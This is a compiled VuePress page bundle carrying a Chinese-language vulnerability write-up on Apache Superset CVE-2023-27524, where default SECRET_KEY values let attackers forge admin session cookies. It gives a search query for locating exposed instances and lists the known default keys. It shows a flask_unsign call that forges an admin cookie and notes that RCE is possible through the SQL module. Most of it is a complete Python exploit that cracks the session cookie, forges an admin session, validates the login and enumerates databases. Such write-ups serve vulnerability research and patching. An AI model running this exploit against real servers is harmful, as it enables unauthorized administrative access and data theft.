import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{o as s,c as a,e}from"./app-58e4a7d6.js";const t={},p=e(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Apache Superset 是一款现代化的开源大数据工具，也是企业级商业智能 Web 应用，用于数据探索分析和数据可视化。它提供了简单易用的无代码可视化构建器和声称是最先进的 SQL 编辑器，用户可以使用这些工具快速地构建数据仪表盘。CVE-2023-27524 中，未经授权的攻击者可根据默认配置的SECRET_KEY伪造成管理员用户访问Apache Superset。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Apache Superse &lt;= 2.0.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="quake" tabindex="-1"><a class="header-anchor" href="#quake" aria-hidden="true">#</a> QUAKE</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app.name=&quot;Apache Superset&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登陆页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230504141719702.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>漏洞修复补丁</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>https://github.com/apache/superset/pull/23186/files
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230504142107277.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>补丁代码中，新建了判断用户是否使用了默认的Key进行配置，如果为默认的Key，就直接中断启动,。但在 Docker的 env 下还是添加了固定的 Key: TEST_NON_DEV_SECRET</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230504142118809.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># https://github.com/horizon3ai/CVE-2023-27524/blob/main/CVE-2023-27524.py
SECRET_KEYS = [
    b&#39;\\x02\\x01thisismyscretkey\\x01\\x02\\\\e\\\\y\\\\y\\\\h&#39;,  # version &lt; 1.4.1
    b&#39;CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET&#39;,          # version &gt;= 1.4.1
    b&#39;thisISaSECRET_1234&#39;,                            # deployment template
    b&#39;YOUR_OWN_RANDOM_GENERATED_SECRET_KEY&#39;,          # documentation
    b&#39;TEST_NON_DEV_SECRET&#39;                            # docker compose
]
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>以Docker下的环境举例</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230504142138933.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>初次请求时会获取到 Cookie, 使用默认Key验证 Cookie是否可被伪造</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230504142150081.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>登陆主页面观察主要参数</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230504142206013.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>通过设置参数 user_id 和 _user_id 为 1 ,构造加密Cookie</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&gt;&gt;&gt; from flask_unsign import session
&gt;&gt;&gt; session.sign({&#39;_user_id&#39;: 1, &#39;user_id&#39;: 1},&#39;TEST_NON_DEV_SECRET&#39;)
&#39;eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZE51uw.EdD7zSzojgY4keqZLOKR4GndJf8&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>利用构造的 Cookie就可以获取到 Web后台管理权限, 后台中存在数据库语句执行模块，通过设置允许执行其他数据库语句后利用数据库语句 RCE</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230504142222421.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230504142234700.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> flask_unsign <span class="token keyword">import</span> session
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> urllib3
<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> re
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>urllib3<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InsecureRequestWarning<span class="token punctuation">)</span>


SECRET_KEYS <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">b&#39;\\x02\\x01thisismyscretkey\\x01\\x02\\\\e\\\\y\\\\y\\\\h&#39;</span><span class="token punctuation">,</span>  <span class="token comment"># version &lt; 1.4.1</span>
    <span class="token string">b&#39;CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET&#39;</span><span class="token punctuation">,</span>          <span class="token comment"># version &gt;= 1.4.1</span>
    <span class="token string">b&#39;thisISaSECRET_1234&#39;</span><span class="token punctuation">,</span>                            <span class="token comment"># deployment template</span>
    <span class="token string">b&#39;YOUR_OWN_RANDOM_GENERATED_SECRET_KEY&#39;</span><span class="token punctuation">,</span>          <span class="token comment"># documentation</span>
    <span class="token string">b&#39;TEST_NON_DEV_SECRET&#39;</span>                            <span class="token comment"># docker compose</span>
<span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--url&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-u&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Base URL of Superset instance&#39;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--id&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;User ID to forge session cookie for, default=1&#39;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">&#39;1&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--validate&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-v&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Validate login&#39;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">&#39;store_true&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--timeout&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-t&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Time to wait before using forged session cookie, default=5s&#39;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        u <span class="token operator">=</span> args<span class="token punctuation">.</span>url<span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">&#39;/&#39;</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&#39;/login/&#39;</span>

        headers <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:101.0) Gecko/20100101 Firefox/101.0&#39;</span>
        <span class="token punctuation">}</span>

        resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>u<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> resp<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;Error retrieving login page at </span><span class="token interpolation"><span class="token punctuation">{</span>u<span class="token punctuation">}</span></span><span class="token string">, status code: </span><span class="token interpolation"><span class="token punctuation">{</span>resp<span class="token punctuation">.</span>status_code<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>

        session_cookie <span class="token operator">=</span> <span class="token boolean">None</span>
        <span class="token keyword">for</span> c <span class="token keyword">in</span> resp<span class="token punctuation">.</span>cookies<span class="token punctuation">:</span>
            <span class="token keyword">if</span> c<span class="token punctuation">.</span>name <span class="token operator">==</span> <span class="token string">&#39;session&#39;</span><span class="token punctuation">:</span>
                session_cookie <span class="token operator">=</span> c<span class="token punctuation">.</span>value
                <span class="token keyword">break</span>

        <span class="token keyword">if</span> <span class="token keyword">not</span> session_cookie<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;Error: No session cookie found&#39;</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;Got session cookie: </span><span class="token interpolation"><span class="token punctuation">{</span>session_cookie<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span>

        <span class="token keyword">try</span><span class="token punctuation">:</span>
            decoded <span class="token operator">=</span> session<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>session_cookie<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;Decoded session cookie: </span><span class="token interpolation"><span class="token punctuation">{</span>decoded<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;Error: Not a Flask session cookie&#39;</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>

        <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r&#39;&amp;#34;version_string&amp;#34;: &amp;#34;(.*?)&amp;#34&#39;</span><span class="token punctuation">,</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>
            version <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            version <span class="token operator">=</span> <span class="token string">&#39;Unknown&#39;</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;Superset Version: </span><span class="token interpolation"><span class="token punctuation">{</span>version<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span>


        <span class="token keyword">for</span> i<span class="token punctuation">,</span> k <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>SECRET_KEYS<span class="token punctuation">)</span><span class="token punctuation">:</span>
            cracked <span class="token operator">=</span> session<span class="token punctuation">.</span>verify<span class="token punctuation">(</span>session_cookie<span class="token punctuation">,</span> k<span class="token punctuation">)</span>
            <span class="token keyword">if</span> cracked<span class="token punctuation">:</span>
                <span class="token keyword">break</span>

        <span class="token keyword">if</span> <span class="token keyword">not</span> cracked<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;Failed to crack session cookie&#39;</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;Vulnerable to CVE-2023-27524 - Using default SECRET_KEY: </span><span class="token interpolation"><span class="token punctuation">{</span>k<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span>

        <span class="token keyword">try</span><span class="token punctuation">:</span>
            user_id <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span><span class="token builtin">id</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            user_id <span class="token operator">=</span> args<span class="token punctuation">.</span><span class="token builtin">id</span>

        forged_cookie <span class="token operator">=</span> session<span class="token punctuation">.</span>sign<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">&#39;_user_id&#39;</span><span class="token punctuation">:</span> user_id<span class="token punctuation">,</span> <span class="token string">&#39;user_id&#39;</span><span class="token punctuation">:</span> user_id<span class="token punctuation">}</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;Forged session cookie for user </span><span class="token interpolation"><span class="token punctuation">{</span>user_id<span class="token punctuation">}</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">{</span>forged_cookie<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> args<span class="token punctuation">.</span>validate<span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                headers<span class="token punctuation">[</span><span class="token string">&#39;Cookie&#39;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f&#39;session=</span><span class="token interpolation"><span class="token punctuation">{</span>forged_cookie<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;Sleeping </span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>timeout<span class="token punctuation">}</span></span><span class="token string"> seconds before using forged cookie to account for time drift...&#39;</span></span><span class="token punctuation">)</span>
                sleep<span class="token punctuation">(</span>args<span class="token punctuation">.</span>timeout<span class="token punctuation">)</span>
                resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>u<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> resp<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">302</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;Got 302 on login, forged cookie appears to have been accepted&#39;</span></span><span class="token punctuation">)</span>
                    validated <span class="token operator">=</span> <span class="token boolean">True</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;Got status code </span><span class="token interpolation"><span class="token punctuation">{</span>resp<span class="token punctuation">.</span>status_code<span class="token punctuation">}</span></span><span class="token string"> on login instead of expected redirect 302. Forged cookie does not appear to be valid. Re-check user id.&#39;</span></span><span class="token punctuation">)</span>
            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e_inner<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;Got error </span><span class="token interpolation"><span class="token punctuation">{</span>e_inner<span class="token punctuation">}</span></span><span class="token string"> on login instead of expected redirect 302. Forged cookie does not appear to be valid. Re-check user id.&#39;</span></span><span class="token punctuation">)</span>

            <span class="token keyword">if</span> <span class="token keyword">not</span> validated<span class="token punctuation">:</span>
                <span class="token keyword">return</span>

            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;Enumerating databases&#39;</span><span class="token punctuation">)</span>
            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                database_url_base <span class="token operator">=</span> args<span class="token punctuation">.</span>url<span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">&#39;/&#39;</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&#39;/api/v1/database&#39;</span>
                <span class="token keyword">try</span><span class="token punctuation">:</span>
                    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>database_url_base<span class="token punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
                    <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
                        result <span class="token operator">=</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&#39;result&#39;</span><span class="token punctuation">]</span> <span class="token comment"># validate response is JSON</span>
                        name <span class="token operator">=</span> result<span class="token punctuation">[</span><span class="token string">&#39;database_name&#39;</span><span class="token punctuation">]</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;Found database </span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span>
                    <span class="token keyword">elif</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">:</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;Done enumerating databases&#39;</span></span><span class="token punctuation">)</span>
                        <span class="token keyword">break</span> <span class="token comment"># no more databases</span>
                    <span class="token keyword">else</span><span class="token punctuation">:</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;Unexpected error: status code=</span><span class="token interpolation"><span class="token punctuation">{</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span>
                        <span class="token keyword">break</span>
                <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e_inner<span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;Unexpected error: </span><span class="token interpolation"><span class="token punctuation">{</span>e_inner<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span>
                    <span class="token keyword">break</span>


    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;Unexpected error: </span><span class="token interpolation"><span class="token punctuation">{</span>e<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,28),o=[p];function i(c,l){return s(),a("div",null,o)}const k=n(t,[["render",i],["__file","Apache Superset SECRET_KEY 未授权访问漏洞 CVE-2023-27524.html.vue"]]);export{k as default};
